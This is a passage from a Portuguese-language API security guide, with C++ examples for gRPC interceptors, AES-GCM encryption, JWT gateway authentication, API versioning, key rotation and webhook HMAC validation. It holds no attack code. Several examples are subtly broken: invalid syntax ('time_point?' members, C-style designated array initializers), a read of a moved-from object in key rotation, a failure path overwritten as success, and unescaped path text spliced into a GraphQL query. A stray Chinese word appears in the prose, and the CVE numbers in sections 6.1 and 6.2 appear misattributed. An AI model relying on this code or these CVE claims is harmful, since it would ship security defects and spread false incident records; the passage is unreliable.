        std::ifstream file(path);
        if (!file.is_open()) {
            throw std::runtime_error(
                "Failed to open certificate file: " + path);
        }
        return std::string(
            (std::istreambuf_iterator<char>(file)),
            std::istreambuf_iterator<char>());
    }
};
```

### 5.2 Padrões de Interceptor

Interceptors gRPC permitem interceptar chamadas para logging, autenticação e validação:

```cpp
class SecurityInterceptor : public grpc::interceptors::ServerInterceptor {
public:
    explicit SecurityInterceptor(
        std::function<bool(const grpc::ServerContext&)> auth_checker)
        : auth_checker_(std::move(auth_checker)) {}

    void Intercept(grpc::interceptors::InterceptorBatchMethods* methods) override {
        if (!methods) return;

        if (methods->QueryInterceptionBatchPoint(
                grpc::interceptors::PreCulling)) {

            grpc::ServerContext* context = nullptr;
            methods->GetInterceptedServerContext(&context);

            if (context && !auth_checker_(*context)) {
                methods->SetReturn(
                    grpc::Status(grpc::StatusCode::UNAUTHENTICATED,
                                 "Authentication required"));
                return;
            }

            auto start_time = std::chrono::steady_clock::now();
            methods->Proceed();

            auto duration = std::chrono::steady_clock::now() - start_time;
            auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(
                duration).count();

            if (context) {
                log_rpc_call(
                    context->peer(),
                    context->method(),
                    ms
                );
            }
        }
    }

private:
    std::function<bool(const grpc::ServerContext&)> auth_checker_;

    void log_rpc_call(const std::string& peer,
                      const std::string& method,
                      int64_t duration_ms) const {
        std::string safe_peer = sanitize_log_string(peer);
        std::string safe_method = sanitize_log_string(method);
        std::cout << "[RPC] " << safe_method
                  << " peer=" << safe_peer
                  << " duration=" << duration_ms << "ms" << std::endl;
    }

    static std::string sanitize_log_string(const std::string& input) {
        std::string result;
        result.reserve(input.size());
        for (char c : input) {
            if (std::isprint(static_cast<unsigned char>(c))) {
                result += c;
            }
        }
        if (result.size() > 200) result.resize(200);
        return result;
    }
};
```

### 5.3 Criptografia em Nível de Mensagem

Para dados sensíveis que requerem proteção além do TLS no transporte:

```cpp
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <vector>

class MessageEncryptor {
public:
    explicit MessageEncryptor(const std::array<unsigned char, 32>& key)
        : key_(key) {}

    struct EncryptedMessage {
        std::vector<unsigned char> ciphertext;
        std::vector<unsigned char> nonce;
        std::vector<unsigned char> tag;
    };

    EncryptedMessage encrypt(const std::vector<unsigned char>& plaintext) {
        EncryptedMessage result;

        result.nonce.resize(NONCE_SIZE);
        if (RAND_bytes(result.nonce.data(), NONCE_SIZE) != 1) {
            throw std::runtime_error("Failed to generate random nonce");
        }

        result.ciphertext.resize(plaintext.size() + EVP_MAX_BLOCK_LENGTH);
        result.tag.resize(TAG_SIZE);

        int out_len = 0;
        int final_len = 0;

        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) throw std::runtime_error("Failed to create cipher context");

        EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr,
                           key_.data(), result.nonce.data());

        EVP_EncryptUpdate(ctx, result.ciphertext.data(), &out_len,
                          plaintext.data(), plaintext.size());

        EVP_EncryptFinal_ex(ctx, result.ciphertext.data() + out_len,
                            &final_len);
        out_len += final_len;

        result.ciphertext.resize(out_len);

        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG,
                            TAG_SIZE, result.tag.data());

        EVP_CIPHER_CTX_free(ctx);
        return result;
    }

    std::vector<unsigned char> decrypt(const EncryptedMessage& msg) {
        std::vector<unsigned char> plaintext(msg.ciphertext.size());

        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) throw std::runtime_error("Failed to create cipher context");

        EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr,
                           key_.data(), msg.nonce.data());

        int out_len = 0;
        int final_len = 0;

        EVP_DecryptUpdate(ctx, plaintext.data(), &out_len,
                          msg.ciphertext.data(), msg.ciphertext.size());

        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG,
                            TAG_SIZE,
                            const_cast<unsigned char*>(msg.tag.data()));

        int ret = EVP_DecryptFinal_ex(
            ctx, plaintext.data() + out_len, &final_len);

        EVP_CIPHER_CTX_free(ctx);

        if (ret <= 0) {
            throw std::runtime_error("Decryption failed: tag mismatch");
        }

        out_len += final_len;
        plaintext.resize(out_len);
        return plaintext;
    }

private:
    static constexpr int NONCE_SIZE = 12;
    static constexpr int TAG_SIZE = 16;
    std::array<unsigned char, 32> key_;
};
```

### 5.4 Timeouts e Deadlines

Timeouts inadequados permitem abuso de recursos e podem levar a denial of service:

```cpp
class DeadlineEnforcer {
public:
    struct DeadlineConfig {
        std::chrono::milliseconds default_deadline{5000};
        std::chrono::milliseconds max_deadline{30000};
        std::chrono::milliseconds min_deadline{100};
    };

    explicit DeadlineEnforcer(DeadlineConfig config)
        : config_(config) {}

    std::chrono::milliseconds sanitize_deadline(
        std::chrono::milliseconds requested) const {
        if (requested < config_.min_deadline) {
            return config_.min_deadline;
        }
        if (requested > config_.max_deadline) {
            return config_.max_deadline;
        }
        return requested;
    }

    std::chrono::steady_clock::time_point create_deadline(
        std::chrono::milliseconds override_value = std::chrono::milliseconds(0)) {
        auto deadline_ms = (override_value.count() > 0)
            ? sanitize_deadline(override_value)
            : config_.default_deadline;
        return std::chrono::steady_clock::now() + deadline_ms;
    }

    bool is_expired(std::chrono::steady_clock::time_point deadline) const {
        return std::chrono::steady_clock::now() >= deadline;
    }

private:
    DeadlineConfig config_;
};
```

---

## 6. Padrões de API Gateway

### 6.1 CVE-2020-36149 — Exposição de Swagger/OpenAPI

Múltiplas organizações expuseram seus arquivos Swagger/OpenAPI em endpoints públicos, permitindo que atacantes mapeassem completamente a superfície de ataque da API. A documentação detalhada de endpoints, parâmetros e schemas facilita a exploração direcionada.

### 6.2 CVE-2019-11234 — Uber API Key em Repositório Público

A Uber teve chaves de API expostas em repositórios públicos no GitHub, permitindo acesso não autorizado a APIs internas. A detecção ocorreu apenas após auditoria externa, demonstrando a necessidade de scan contínuo de credenciais.

### 6.3 Autenticação Centralizada

```cpp
class ApiGatewayAuthenticator {
public:
    struct AuthConfig {
        std::string jwt_secret;
        size_t token_expiry_seconds = 3600;
        std::vector<std::string> required_scopes;
    };

    explicit ApiGatewayAuthenticator(AuthConfig config)
        : config_(std::move(config)) {}

    struct AuthResult {
        bool authenticated;
        std::string user_id;
        std::vector<std::string> scopes;
        std::string error_message;
        int status_code;
    };

    AuthResult authenticate(const std::string& auth_header) {
        if (auth_header.empty()) {
            return {false, "", {}, "Missing Authorization header", 401};
        }

        std::string token;
        if (auth_header.substr(0, 7) == "Bearer ") {
            token = auth_header.substr(7);
        } else {
            return {false, "", {},
                    "Invalid Authorization scheme", 401};
        }

        try {
            auto payload = verify_jwt(token);
            return {true, payload.user_id, payload.scopes, "", 200};
        } catch (const std::exception& e) {
            return {false, "", {}, std::string(e.what()), 401};
        }
    }

    bool has_required_scopes(const std::vector<std::string>& user_scopes) {
        for (const auto& required : config_.required_scopes) {
            bool found = false;
            for (const auto& scope : user_scopes) {
                if (scope == required) { found = true; break; }
            }
            if (!found) return false;
        }
        return true;
    }

private:
    AuthConfig config_;

    struct JwtPayload {
        std::string user_id;
        std::vector<std::string> scopes;
        int64_t exp;
    };

    JwtPayload verify_jwt(const std::string& token) {
        auto parts = split_token(token);
        if (parts.size() != 3) {
            throw std::runtime_error("Invalid JWT format");
        }

        std::string expected_sig = hmac_sha256(
            config_.jwt_secret,
            parts[0] + "." + parts[1]
        );

        if (!constant_time_compare(expected_sig, parts[2])) {
            throw std::runtime_error("Invalid JWT signature");
        }

        std::string payload_json = base64_url_decode(parts[1]);
        auto payload = nlohmann::json::parse(payload_json);

        if (payload.contains("exp")) {
            int64_t exp = payload["exp"].get<int64_t>();
            auto now = std::chrono::duration_cast<std::chrono::seconds>(
                std::chrono::system_clock::now().time_since_epoch()
            ).count();
            if (exp < now) {
                throw std::runtime_error("Token expired");
            }
        }

        JwtPayload result;
        result.user_id = payload.value("sub", "");
        result.exp = payload.value("exp", 0);

        if (payload.contains("scopes") && payload["scopes"].is_array()) {
            for (const auto& s : payload["scopes"]) {
                result.scopes.push_back(s.get<std::string>());
            }
        }

        return result;
    }

    static std::vector<std::string> split_token(const std::string& token) {
        std::vector<std::string> parts;
        size_t start = 0;
        size_t pos;
        while ((pos = token.find('.', start)) != std::string::npos) {
            parts.push_back(token.substr(start, pos - start));
            start = pos + 1;
        }
        parts.push_back(token.substr(start));
        return parts;
    }

    static std::string hmac_sha256(const std::string& key,
                                    const std::string& data) {
        unsigned char digest[EVP_MAX_MD_SIZE];
        unsigned int len = 0;

        HMAC(EVP_sha256(),
             key.c_str(), static_cast<int>(key.size()),
             reinterpret_cast<const unsigned char*>(data.c_str()),
             data.size(),
             digest, &len);

        return base64_url_encode(
            std::string(reinterpret_cast<char*>(digest), len));
    }

    static bool constant_time_compare(const std::string& a,
                                      const std::string& b) {
        if (a.size() != b.size()) return false;
        volatile unsigned char result = 0;
        for (size_t i = 0; i < a.size(); ++i) {
            result |= static_cast<unsigned char>(a[i]) ^
                      static_cast<unsigned char>(b[i]);
        }
        return result == 0;
    }

    static std::string base64_url_encode(const std::string& input) {
        static const char table[] =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
            "0123456789-_";

        std::string result;
        int val = 0;
        int valb = -6;

        for (unsigned char c : input) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                result.push_back(table[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) result.push_back(table[((val << 8) >> (valb + 8)) & 0x3F]);
        while (result.size() % 4 != 0) result.push_back('=');
        return result;
    }

    static std::string base64_url_decode(const std::string& input) {
        static const unsigned char table[256] = {
            ['A'] = 0,  ['B'] = 1,  ['C'] = 2,  ['D'] = 3,
            ['E'] = 4,  ['F'] = 5,  ['G'] = 6,  ['H'] = 7,
            ['I'] = 8,  ['J'] = 9,  ['K'] = 10, ['L'] = 11,
            ['M'] = 12, ['N'] = 13, ['O'] = 14, ['P'] = 15,
            ['Q'] = 16, ['R'] = 17, ['S'] = 18, ['T'] = 19,
            ['U'] = 20, ['V'] = 21, ['W'] = 22, ['X'] = 23,
            ['Y'] = 24, ['Z'] = 25,
            ['a'] = 26, ['b'] = 27, ['c'] = 28, ['d'] = 29,
            ['e'] = 30, ['f'] = 31, ['g'] = 32, ['h'] = 33,
            ['i'] = 34, ['j'] = 35, ['k'] = 36, ['l'] = 37,
            ['m'] = 38, ['n'] = 39, ['o'] = 40, ['p'] = 41,
            ['q'] = 42, ['r'] = 43, ['s'] = 44, ['t'] = 45,
            ['u'] = 46, ['v'] = 47, ['w'] = 48, ['x'] = 49,
            ['y'] = 50, ['z'] = 51,
            ['0'] = 52, ['1'] = 53, ['2'] = 54, ['3'] = 55,
            ['4'] = 56, ['5'] = 57, ['6'] = 58, ['7'] = 59,
            ['8'] = 60, ['9'] = 61, ['-'] = 62, ['_'] = 63
        };

        std::string result;
        int val = 0;
        int bits = -8;

        for (unsigned char c : input) {
            if (c == '=') break;
            if (c >= 256 || table[c] == 0 && c != 'A') continue;
            val = (val << 6) + table[c];
            bits += 6;
            if (bits >= 0) {
                result.push_back(static_cast<char>((val >> bits) & 0xFF));
                bits -= 8;
            }
        }
        return result;
    }
};
```

### 6.4 Transformação de Request/Response e Tradução de Protocolo

O API Gateway pode transformar e rotear requests entre protocolos:

```cpp
class ProtocolTranslator {
public:
    enum class Protocol { REST, GraphQL, gRPC };

    struct TranslationResult {
        bool success;
        std::string body;
        int status_code;
        std::map<std::string, std::string> headers;
    };

    TranslationResult translate_rest_to_graphql(
        const std::string& rest_method,
        const std::string& rest_path,
        const nlohmann::json& rest_body) {

        TranslationResult result;
        result.status_code = 200;

        if (rest_method == "GET") {
            std::string query_name = extract_resource_name(rest_path);
            std::string query = "{ " + query_name + "(id: \""
                                + rest_path + "\") { id } }";
            result.body = R"({"query": ")" + escape_json_string(query) + R"("})";
        } else if (rest_method == "POST" || rest_method == "PUT") {
            std::string mutation = build_mutation(rest_path, rest_body);
            result.body = R"({"query": ")" + escape_json_string(mutation) + R"("})";
        } else {
            result.success = false;
            result.status_code = 405;
            result.body = R"({"error": "Method not supported for translation"})";
        }

        result.success = true;
        result.headers["Content-Type"] = "application/json";
        return result;
    }

private:
    static std::string extract_resource_name(const std::string& path) {
        auto last_slash = path.rfind('/');
        if (last_slash != std::string::npos) {
            return path.substr(last_slash + 1);
        }
        return path;
    }

    static std::string build_mutation(const std::string& path,
                                       const nlohmann::json& body) {
        std::string resource = extract_resource_name(path);
        return "mutation { create" + resource
               + "(input: " + body.dump() + ") { id } }";
    }

    static std::string escape_json_string(const std::string& input) {
        std::string result;
        for (char c : input) {
            switch (c) {
                case '"':  result += "\\\""; break;
                case '\\': result += "\\\\"; break;
                case '\n': result += "\\n";  break;
                case '\t': result += "\\t";  break;
                default:   result += c;       break;
            }
        }
        return result;
    }
};
```

### 6.5 Segurança de Versionamento de API

```cpp
class ApiVersionValidator {
public:
    struct VersionConfig {
        int current_version;
        std::vector<int> supported_versions;
        int min_version;
    };

    explicit ApiVersionValidator(VersionConfig config)
        : config_(config) {}

    struct VersionCheckResult {
        bool valid;
        int resolved_version;
        bool deprecated;
        std::string deprecation_notice;
        int status_code;
    };

    VersionCheckResult validate(int requested_version) const {
        VersionCheckResult result;

        for (int v : config_.supported_versions) {
            if (v == requested_version) {
                result.valid = true;
                result.resolved_version = requested_version;
                result.deprecated = (requested_version < config_.current_version);
                result.status_code = 200;

                if (result.deprecated) {
                    result.deprecation_notice =
                        "API version " + std::to_string(requested_version)
                        + " is deprecated. Please migrate to version "
                        + std::to_string(config_.current_version);
                }
                return result;
            }
        }

        result.valid = false;
        result.resolved_version = -1;
        result.status_code = 400;
        result.deprecation_notice =
            "API version " + std::to_string(requested_version)
            + " is not supported. Supported versions: "
            + join_versions(config_.supported_versions);
        return result;
    }

    VersionCheckResult resolve_from_header(
        const std::string& api_version_header) const {
        if (api_version_header.empty()) {
            return validate(config_.current_version);
        }

        int version = parse_version(api_version_header);
        if (version <= 0) {
            return {false, -1, false, "Invalid version format", 400};
        }
        return validate(version);
    }

private:
    VersionConfig config_;

    static int parse_version(const std::string& version_str) {
        try {
            return std::stoi(version_str);
        } catch (...) {
            return -1;
        }
    }

    static std::string join_versions(const std::vector<int>& versions) {
        std::string result;
        for (size_t i = 0; i < versions.size(); ++i) {
            if (i > 0) result += ", ";
            result += std::to_string(versions[i]);
        }
        return result;
    }
};
```

### 6.6 Arquitetura Completa de API Gateway em C++

```cpp
class SecureApiGateway {
public:
    struct GatewayConfig {
        ApiGatewayAuthenticator::AuthConfig auth;
        MultiDimensionRateLimiter::LimitConfig rate_limit;
        ApiVersionValidator::VersionConfig version;
        RestSecurityMiddleware::Config rest_security;
        size_t max_body_size = 1048576;
        bool enable_request_logging = true;
    };

    explicit SecureApiGateway(GatewayConfig config)
        : config_(std::move(config))
        , authenticator_(config_.auth)
        , rate_limiter_(config_.rate_limit)
        , version_validator_(config_.version)
        , rest_middleware_(config_.rest_security) {}

    struct GatewayResponse {
        int status_code;
        std::string body;
        std::map<std::string, std::string> headers;
    };

    GatewayResponse handle_request(
        const std::string& method,
        const std::string& path,
        const std::string& auth_header,
        const std::string& api_version,
        const std::string& content_type,
        size_t content_length,
        const nlohmann::json& body,
        const std::string& client_ip) {

        GatewayResponse response;
        response.headers["Content-Type"] = "application/json";

        auto version_check = version_validator_.resolve_from_header(api_version);
        if (!version_check.valid) {
            response.status_code = version_check.status_code;
            response.body = R"({"error": ")" + version_check.deprecation_notice
                            + R"("})";
            return response;
        }

        if (version_check.deprecated) {
            response.headers["Deprecation"] = "true";
            response.headers["Sunset"] = get_sunset_date();
            response.headers["Link"] =
                "<https://api.example.com/v"
                + std::to_string(version_check.resolved_version)
                + "/docs>; rel=\"successor-version\"";
        }

        auto auth_result = authenticator_.authenticate(auth_header);
        if (!auth_result.authenticated) {
            response.status_code = auth_result.status_code;
            response.body = R"({"error": ")" + auth_result.error_message
                            + R"("})";
            return response;
        }

        auto rl_result = rate_limiter_.check(
            client_ip, auth_result.user_id, path);
        if (!rl_result.allowed) {
            response.status_code = 429;
            response.body = R"({"error": "Too many requests"})";
            response.headers["Retry-After"] =
                std::to_string(rl_result.retry_after.count());
            response.headers["X-RateLimit-Limit"] = "100";
            response.headers["X-RateLimit-Remaining"] = "0";
            return response;
        }

        auto rest_ctx = rest_middleware_.process_request(
            method, content_type, content_length, 10);

        if (!rest_ctx.valid) {
            response.status_code = rest_ctx.status_code;
            response.body = R"({"error": ")" + rest_ctx.error_message
                            + R"("})";
            return response;
        }

        for (const auto& [key, value] : rest_ctx.security_headers) {
            response.headers[key] = value;
        }

        if (config_.enable_request_logging) {
            log_request(client_ip, auth_result.user_id, method, path,
                        response.status_code);
        }

        response.status_code = 200;
        response.body = R"({"status": "ok"})";
        return response;
    }

private:
    GatewayConfig config_;
    ApiGatewayAuthenticator authenticator_;
    MultiDimensionRateLimiter rate_limiter_;
    ApiVersionValidator version_validator_;
    RestSecurityMiddleware rest_middleware_;

    static std::string get_sunset_date() {
        auto now = std::chrono::system_clock::now();
        auto future = now + std::chrono::hours(24 * 90);
        auto time_t = std::chrono::system_clock::to_time_t(future);
        char buffer[64];
        std::strftime(buffer, sizeof(buffer),
                      "%a, %d %b %Y 00:00:00 GMT",
                      std::gmtime(&time_t));
        return std::string(buffer);
    }

    void log_request(const std::string& client_ip,
                     const std::string& user_id,
                     const std::string& method,
                     const std::string& path,
                     int status_code) const {
        std::string safe_ip = sanitize_for_log(client_ip);
        std::string safe_user = sanitize_for_log(user_id);
        std::string safe_path = sanitize_for_log(path);

        std::cout << "[GATEWAY] " << safe_ip
                  << " user=" << safe_user
                  << " " << method << " " << safe_path
                  << " status=" << status_code << std::endl;
    }

    static std::string sanitize_for_log(const std::string& input) {
        std::string result;
        result.reserve(input.size());
        for (char c : input) {
            if (std::isprint(static_cast<unsigned char>(c))
                && c != '\n' && c != '\r') {
                result += c;
            } else {
                result += "_";
            }
        }
        if (result.size() > 200) result.resize(200);
        return result;
    }
};
```

---

## 7. Versionamento e Deprecação Segura

### 7.1 Estratégias de Versionamento

Versionamento adequado é essencial para a evolução segura de APIs. Estratégias comuns incluem:

- **Versionamento por URL** (`/v1/users`): claro, fácil de rotar. Desvantagem: proliferação de rotas.
- **Versionamento por Header** (`Accept: application/vnd.api+json; version=1`): URL limpa, mas menos discoverável.
- **Versionamento por Query Parameter** (`?version=1`): simples, mas容易 esquecido em caches.
- **Versionamento por Content Negotiation**: flexível, mas complexo de implementar.

Recomendação para APIs públicas: **versionamento por URL** para clareza e auditabilidade.

### 7.2 Processo de Deprecação Seguro

Uma deprecação segura requer planejamento antecipado, comunicação clara e suporte a migração:

```cpp
class DeprecationManager {
public:
    struct DeprecationPlan {
        int version;
        std::string announcement_date;
        std::string sunset_date;
        std::string migration_guide_url;
        std::vector<std::string> deprecated_endpoints;
        std::map<std::string, std::string> replacement_endpoints;
    };

    explicit DeprecationManager(DeprecationPlan plan)
        : plan_(std::move(plan)) {}

    std::map<std::string, std::string> get_deprecation_headers(
        const std::string& endpoint) const {
        std::map<std::string, std::string> headers;

        headers["Deprecation"] = "true";
        headers["Sunset"] = plan_.sunset_date;

        auto it = plan_.replacement_endpoints.find(endpoint);
        if (it != plan_.replacement_endpoints.end()) {
            headers["Link"] = "<" + it->second
                              + ">; rel=\"successor-version\"";
        } else {
            headers["Link"] = "<" + plan_.migration_guide_url
                              + ">; rel=\"deprecation\"";
        }

        headers["Warning"] =
            "299 - \"This endpoint is deprecated and will be removed on "
            + plan_.sunset_date + "\"";

        return headers;
    }

    bool is_deprecated(const std::string& endpoint) const {
        for (const auto& dep : plan_.deprecated_endpoints) {
            if (dep == endpoint) return true;
        }
        return false;
    }

    struct MigrationStatus {
        int days_until_sunset;
        bool migration_required;
        std::string migration_path;
    };

    MigrationStatus get_migration_status(
        const std::string& endpoint) const {
        MigrationStatus status;
        status.days_until_sunset = calculate_days_until_sunset();
        status.migration_required = is_deprecated(endpoint);

        auto it = plan_.replacement_endpoints.find(endpoint);
        if (it != plan_.replacement_endpoints.end()) {
            status.migration_path = it->second;
        } else {
            status.migration_path = plan_.migration_guide_url;
        }

        return status;
    }

private:
    DeprecationPlan plan_;

    int calculate_days_until_sunset() const {
        std::tm sunset_tm = {};
        std::istringstream ss(plan_.sunset_date);
        ss >> std::get_time(&sunset_tm, "%Y-%m-%d");

        auto sunset_time = std::chrono::system_clock::from_time_t(
            std::mktime(&sunset_tm));
        auto now = std::chrono::system_clock::now();

        return static_cast<int>(
            std::chrono::duration_cast<std::chrono::hours>(
                sunset_time - now).count() / 24);
    }
};
```

### 7.3 Gerenciamento de Breaking Changes

```cpp
class BreakingChangeDetector {
public:
    struct ApiEndpoint {
        std::string method;
        std::string path;
        std::vector<std::string> required_params;
        std::string response_schema;
    };

    struct ChangeReport {
        bool has_breaking_changes;
        std::vector<std::string> breaking_changes;
        std::vector<std::string> additive_changes;
        std::vector<std::string> warnings;
    };

    ChangeReport analyze(const std::vector<ApiEndpoint>& old_endpoints,
                         const std::vector<ApiEndpoint>& new_endpoints) {
        ChangeReport report;
        report.has_breaking_changes = false;

        std::map<std::string, const ApiEndpoint*> old_map;
        for (const auto& ep : old_endpoints) {
            old_map[ep.method + " " + ep.path] = &ep;
        }

        for (const auto& [key, old_ep] : old_map) {
            bool found = false;
            for (const auto& new_ep : new_endpoints) {
                if (new_ep.method + " " + new_ep.path == key) {
                    found = true;

                    if (new_ep.required_params.size()
                        < old_ep->required_params.size()) {
                        report.breaking_changes.push_back(
                            "Endpoint " + key
                            + ": required parameter removed");
                        report.has_breaking_changes = true;
                    }

                    if (new_ep.response_schema != old_ep->response_schema) {
                        report.warnings.push_back(
                            "Endpoint " + key
                            + ": response schema changed");
                    }
                    break;
                }
            }

            if (!found) {
                report.breaking_changes.push_back(
                    "Endpoint removed: " + key);
                report.has_breaking_changes = true;
            }
        }

        for (const auto& new_ep : new_endpoints) {
            std::string key = new_ep.method + " " + new_ep.path;
            if (old_map.find(key) == old_map.end()) {
                report.additive_changes.push_back(
                    "New endpoint added: " + key);
            }
        }

        return report;
    }
};
```

---

## 8. Gerenciamento de Chaves de API

### 8.1 Geração de Chaves com CSPRNG

Chaves de API devem ser geradas usando geradores de números aleatórios criptograficamente seguros (CSPRNG):

```cpp
#include <openssl/rand.h>
#include <openssl/evp.h>
#include <iomanip>
#include <sstream>

class ApiKeyGenerator {
public:
    static std::string generate_api_key(size_t num_bytes = 32) {
        std::vector<unsigned char> random_bytes(num_bytes);

        if (RAND_bytes(random_bytes.data(),
                       static_cast<int>(num_bytes)) != 1) {
            throw std::runtime_error(
                "Failed to generate cryptographically secure random bytes");
        }

        return bytes_to_hex(random_bytes);
    }

    static std::string generate_prefixed_key(
        const std::string& prefix = "sk") {
        std::string key = generate_api_key(32);
        return prefix + "_" + key;
    }

    static std::pair<std::string, std::string>
    generate_key_pair() {
        std::string public_key = generate_prefixed_key("pk");
        std::string secret_key = generate_prefixed_key("sk");
        return {public_key, secret_key};
    }

    static std::string hash_secret(const std::string& secret) {
        std::vector<unsigned char> hash(EVP_MAX_MD_SIZE);
        unsigned int hash_len = 0;

        EVP_Digest(
            secret.c_str(), secret.size(),
            hash.data(), &hash_len,
            EVP_sha256(), nullptr);

        return bytes_to_hex(
            std::vector<unsigned char>(hash.begin(),
                                       hash.begin() + hash_len));
    }

private:
    static std::string bytes_to_hex(
        const std::vector<unsigned char>& bytes) {
        std::ostringstream oss;
        oss << std::hex << std::setfill('0');
        for (unsigned char b : bytes) {
            oss << std::setw(2) << static_cast<int>(b);
        }
        return oss.str();
    }
};
```

### 8.2 Distribuição e Rotação de Chaves

```cpp
class ApiKeyManager {
public:
    struct KeyRecord {
        std::string key_id;
        std::string key_hash;
        std::string owner_id;
        std::vector<std::string> scopes;
        std::chrono::system_clock::time_point created_at;
        std::chrono::system_clock::time_point? expires_at;
        std::chrono::system_clock::time_point? last_used_at;
        bool revoked = false;
    };

    struct RotationPolicy {
        std::chrono::hours max_key_age{24 * 90};
        size_t max_keys_per_owner = 3;
        bool allow_multiple_active_keys = true;
    };

    explicit ApiKeyManager(RotationPolicy policy)
        : policy_(policy) {}

    struct CreateResult {
        bool success;
        std::string key_id;
        std::string secret_key;
        std::string error_message;
    };

    CreateResult create_key(const std::string& owner_id,
                            const std::vector<std::string>& scopes) {
        CreateResult result;

        size_t active_count = count_active_keys(owner_id);
        if (active_count >= policy_.max_keys_per_owner) {
            result.success = false;
            result.error_message = "Maximum number of active keys reached";
            return result;
        }

        result.key_id = ApiKeyGenerator::generate_prefixed_key("ak");
        result.secret_key = ApiKeyGenerator::generate_prefixed_key("sk");

        KeyRecord record;
        record.key_id = result.key_id;
        record.key_hash = ApiKeyGenerator::hash_secret(result.secret_key);
        record.owner_id = owner_id;
        record.scopes = scopes;
        record.created_at = std::chrono::system_clock::now();
        record.expires_at = record.created_at + policy_.max_key_age;

        std::lock_guard<std::mutex> lock(mutex_);
        keys_[record.key_id] = std::move(record);

        result.success = true;
        return result;
    }

    struct ValidationResult {
        bool valid;
        std::string owner_id;
        std::vector<std::string> scopes;
        std::string error_message;
    };

    ValidationResult validate(const std::string& key_id,
                              const std::string& secret) {
        std::lock_guard<std::mutex> lock(mutex_);

        auto it = keys_.find(key_id);
        if (it == keys_.end()) {
            return {false, "", {}, "Key not found"};
        }

        auto& record = it->second;

        if (record.revoked) {
            return {false, "", {}, "Key has been revoked"};
        }

        if (record.expires_at
            && std::chrono::system_clock::now() > *record.expires_at) {
            return {false, "", {}, "Key has expired"};
        }

        std::string provided_hash = ApiKeyGenerator::hash_secret(secret);
        if (provided_hash != record.key_hash) {
            return {false, "", {}, "Invalid secret"};
        }

        record.last_used_at = std::chrono::system_clock::now();

        return {true, record.owner_id, record.scopes, ""};
    }

    bool revoke_key(const std::string& key_id) {
        std::lock_guard<std::mutex> lock(mutex_);
        auto it = keys_.find(key_id);
        if (it == keys_.end()) return false;
        it->second.revoked = true;
        return true;
    }

    std::vector<std::string> rotate_key(const std::string& old_key_id) {
        std::lock_guard<std::mutex> lock(mutex_);

        auto it = keys_.find(old_key_id);
        if (it == keys_.end()) return {};

        auto& old_record = it->second;
        old_record.revoked = true;

        std::string new_secret = ApiKeyGenerator::generate_prefixed_key("sk");

        KeyRecord new_record;
        new_record.key_id = old_record.key_id + "_rotated_"
                            + std::to_string(
                                std::chrono::system_clock::now()
                                    .time_since_epoch().count());
        new_record.key_hash = ApiKeyGenerator::hash_secret(new_secret);
        new_record.owner_id = old_record.owner_id;
        new_record.scopes = old_record.scopes;
        new_record.created_at = std::chrono::system_clock::now();
        new_record.expires_at = new_record.created_at + policy_.max_key_age;

        keys_[new_record.key_id] = std::move(new_record);

        return {new_record.key_id, new_secret};
    }

private:
    RotationPolicy policy_;
    std::map<std::string, KeyRecord> keys_;
    std::mutex mutex_;

    size_t count_active_keys(const std::string& owner_id) const {
        size_t count = 0;
        auto now = std::chrono::system_clock::now();
        for (const auto& [id, record] : keys_) {
            if (record.owner_id == owner_id
                && !record.revoked
                && (!record.expires_at || now <= *record.expires_at)) {
                ++count;
            }
        }
        return count;
    }
};
```

---

## 9. Segurança de Webhooks

### 9.1 Verificação de Assinatura HMAC

Webhooks recebidos de serviços externos devem ser autenticados via assinatura HMAC para garantir integridade e autenticidade:

```cpp
class WebhookSecurityValidator {
public:
    explicit WebhookSecurityValidator(const std::string& signing_secret)
        : signing_secret_(signing_secret) {}

    struct WebhookValidationResult {
        bool valid;
        std::string error_message;
    };

    WebhookValidationResult validate(
        const std::vector<unsigned char>& payload,
        const std::string& received_signature,
        const std::string& timestamp_header,
        int max_age_seconds = 300) {

        auto timestamp = parse_timestamp(timestamp_header);
        auto now = std::chrono::system_clock::now();
        auto age = std::chrono::duration_cast<std::chrono::seconds>(
            now - timestamp);

        if (age.count() > max_age_seconds) {
            return {false, "Timestamp too old: possible replay attack"};
        }

        if (age.count() < -60) {
            return {false, "Timestamp in the future: clock skew detected"};
        }

        std::string payload_to_sign = timestamp_header + "." + std::string(
            reinterpret_cast<const char*>(payload.data()), payload.size());

        std::string expected_signature = compute_hmac_sha256(
            signing_secret_, payload_to_sign);

        if (received_signature.substr(0, 7) == "sha256=") {
            std::string received_hash = received_signature.substr(7);
            if (!constant_time_compare(expected_signature, received_hash)) {
                return {false, "Invalid signature"};
            }
        } else if (received_signature != expected_signature) {
            return {false, "Invalid signature format"};
        }

        return {true, ""};
    }

private:
    std::string signing_secret_;

    std::chrono::system_clock::time_point parse_timestamp(
        const std::string& ts) const {
        int64_t seconds = 0;
        try {
            seconds = std::stoll(ts);
        } catch (...) {
            return std::chrono::system_clock::time_point{};
        }
        return std::chrono::system_clock::time_point(
            std::chrono::seconds(seconds));
    }

    static std::string compute_hmac_sha256(
        const std::string& key,
        const std::string& data) {

        unsigned char digest[EVP_MAX_MD_SIZE];
        unsigned int len = 0;

        HMAC(EVP_sha256(),
             key.c_str(), static_cast<int>(key.size()),
             reinterpret_cast<const unsigned char*>(data.c_str()),
             data.size(),
             digest, &len);

        std::ostringstream oss;
        oss << std::hex << std::setfill('0');
        for (unsigned int i = 0; i < len; ++i) {
            oss << std::setw(2)
                << static_cast<int>(digest[i]);
        }
        return oss.str();
    }

    static bool constant_time_compare(const std::string& a,
                                      const std::string& b) {
        if (a.size() != b.size()) return false;
        volatile unsigned char result = 0;
        for (size_t i = 0; i < a.size(); ++i) {
            result |= static_cast<unsigned char>(a[i])
                      ^ static_cast<unsigned char>(b[i]);
        }
        return result == 0;
    }
};
```

### 9.2 Validação de Payload e Prevenção de Replay

```cpp
